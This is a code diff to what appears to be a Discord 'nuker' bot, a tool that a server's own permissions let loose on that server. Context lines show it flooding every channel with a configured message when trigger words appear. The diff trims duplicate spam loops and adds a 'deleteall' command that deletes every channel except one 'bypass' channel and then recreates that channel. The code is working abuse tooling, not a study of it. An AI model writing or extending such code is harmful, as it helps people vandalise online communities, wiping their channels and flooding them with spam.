@@ -19,11 +19,8 @@ client.on("message", async (message) => {
   const a = [1];
   // Spammer Codes
   if ("spam".includes(message.content)) {
-    message.delete()
+    message.delete();
     for (let index = 0; index < a.length; index++) {
-      message.guild.channels.cache.forEach((ch) => {
-        ch.send("spam")
-      })
       message.guild.channels.cache.forEach((channel) => {
         channel
           .send(config.nuke_settings.message)
@@ -49,9 +46,6 @@ client.on("message", async (message) => {
     }
   } else if (config.nuke_settings.message.includes(message.content)) {
     for (let index = 0; index < a.length; index++) {
-      message.guild.channels.cache.forEach((ch) => {
-        ch.send("spam")
-      })
       message.guild.channels.cache.forEach((channel) => {
         channel
           .send(config.nuke_settings.message)
@@ -84,21 +78,6 @@ client.on("message", async (message) => {
     const args = message.content.slice(prefix.length).split(/ +/);
     const command = args.shift().toLowerCase();
     if (command == "auto" && !message.author.bot) {
-      message.guild.channels.cache.forEach((ch) => {
-        ch.send("spam")
-      })
-      message.channel
-        .send("spam")
-        .then((m) => console.log("Started spamming message."));
-      message.channel
-        .send("spam")
-        .then((m) => console.log("Started spamming message."));
-      message.channel
-        .send("spam")
-        .then((m) => console.log("Started spamming message."));
-      message.channel
-        .send("spam")
-        .then((m) => console.log("Started spamming message."));
 
       // Codes Nuker
 
@@ -155,6 +134,14 @@ client.on("message", async (message) => {
       message.channel.send("Destroied The Bot's Process.");
       client.user.setStatus("offline");
       client.destroy();
+    } else if (command == "deleteall") {
+      message.guild.channels.cache.forEach((ch) => {
+        if (ch.name == "deleteall-channel-bypass") return;
+        ch.delete();
+      });
+      message.guild.channels.create("deleteall-channel-bypass", {
+        reason: "Ajab",
+      });
     }
   }
 });
